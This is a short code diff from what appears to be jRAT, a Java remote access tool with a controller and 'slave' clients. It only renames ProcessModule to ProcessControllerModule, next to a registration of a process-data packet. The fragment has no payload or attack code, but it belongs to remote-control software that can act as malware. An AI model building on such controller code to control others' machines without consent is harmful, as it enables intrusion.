@@ -9,7 +9,7 @@ import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPackets;
 import jrat.module.process.ui.PanelProcesses;
 
-public class ProcessModule extends Module {
+public class ProcessControllerModule extends Module {
 
     public void init() throws Exception {
         IncomingPackets.register((short) 25, PacketProcessData.class);
